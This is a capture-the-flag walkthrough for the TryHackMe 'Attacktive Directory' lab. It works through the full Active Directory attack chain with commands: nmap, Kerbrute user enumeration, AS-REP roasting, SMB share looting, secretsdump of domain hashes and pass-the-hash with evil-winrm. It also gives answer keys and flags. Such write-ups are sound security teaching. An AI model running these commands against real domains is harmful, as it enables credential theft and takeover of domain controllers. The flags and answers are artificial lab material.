# Attacktive Directory - Medium

* Installing Impacket:

```shell
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ && python3 ./setup.py install
```

* Installing Bloodhound and Neo4j:

```shell
sudo apt install bloodhound neo4j
```

---

<details>
<summary>nmap scan for enumeration</summary>

```nmap -T4 -p- -A 10.10.119.253```

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
http-server-header: Microsoft-IIS/10.0
http-methods:
    Potentially risky methods: TRACE
    http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-01 17:47:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  tcpwrapped
    ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
    Not valid before: 2022-03-31T17:17:52
    Not valid after:  2022-09-30T17:17:52
    ssl-date: 2022-04-01T17:48:37+00:00; 0s from scanner time.
    rdp-ntlm-info:
        Target_Name: THM-AD
        NetBIOS_Domain_Name: THM-AD
        NetBIOS_Computer_Name: ATTACKTIVEDIREC
        DNS_Domain_Name: spookysec.local
        DNS_Computer_Name: AttacktiveDirectory.spookysec.local
        Product_Version: 10.0.17763
        System_Time: 2022-04-01T17:48:21+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
http-server-header: Microsoft-HTTPAPI/2.0
    http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
http-server-header: Microsoft-HTTPAPI/2.0
    http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  unknown
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49823/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
smb2-security-mode:
    3.1.1:
        Message signing enabled and required
    smb2-time:
        date: 2022-04-01T17:48:25
        start_date: N/A

</details>

<br>

1. What tool will allow us to enumerate port 139/445? - enum4linux

2. What is the NetBIOS-Domain Name of the machine? - THM-AD

3. What invalid TLD do people commonly use for their Active Directory Domain? - .local

---

* As services such as Kerberos (key authentication service within AD) are running, we can use [Kerbrute tool](https://github.com/ropnop/kerbrute/releases) for brute force

```shell
chmod a+x kerbrute_linux_amd64

./kerbrute_linux_amd64

./kerbrute_linux_amd64 userenum --dc 10.10.119.253 -d spookysec.local userlist_kerberos.txt
```

* This gives us a list of valid usernames.

1. What command within Kerbrute will allow us to enumerate valid usernames? - userenum

2. What notable account is discovered? - svc-admin

3. What is the other notable account is discovered? - backup

---

* Now, with the help of enumerated usernames, we can attempt to abuse Kerberos using ASREPRoasting. We can use the GetNPUsers.py tool in Impacket.

```shell
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/james -no-pass -dc-ip 10.10.119.253
```

* We have to try this for all usernames to check from which accounts we can query a ticket without password.

* This gives us some interesting information.

1. We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password? - svc-admin

2. Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? -  Kerberos 5, etype 23, AS-REP

3. What mode is the hash? - 18200

4. Now crack the hash with the modified password list provided, what is the user accounts password? - management2005

* We can attempt enumeration again, with any shares that the domain controller may be giving out.

```shell
smbclient -L //10.10.119.253 -W spookysec.local -U svc-admin
#to list available shares
```

* Here, the backup share contains a text file. We can use 'get' to transfer the file to our computer.

```shell
smbclient //10.10.119.253/backup -W spookysec.local -U svc-admin
```

1. What utility can we use to map remote SMB shares? - smbclient

2. Which option will list shares? - -L

3. How many remote shares is the server listing? - 6

4. There is one particular share that we have access to that contains a text file. Which share is it? - backup

5. What is the content of the file? - YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

6. Decoding the contents of the file, what is the full contents? - backup@spookysec.local:backup2517860

* Now, we have the credentials for the backup account for the Domain Controller, with special permissions.

* So, we can use secretsdump.py from Impacket, to retrieve all password hashes that this account has to offer.

```shell
python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup@spookysec.local:backup2517860 -target-ip 10.10.119.253
```

1. What method allowed us to dump NTDS.DIT? - DRSUAPI

2. What is the Administrators NTLM hash? - 0e0363213e37b94221497260b0bcb4fc

3. What method of attack could allow us to authenticate as the user without the password? - pass the hash

4. Using a tool called Evil-WinRM what option will allow us to use a hash? - -H

```shell
evil-winrm -i 10.10.119.253 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
#remote login
```

Flags for each account:

1. svc-admin - TryHackMe{K3rb3r0s_Pr3_4uth}

2. backup - TryHackMe{B4ckM3UpSc0tty!}

3. Administrator - TryHackMe{4ctiveD1rectoryM4st3r}
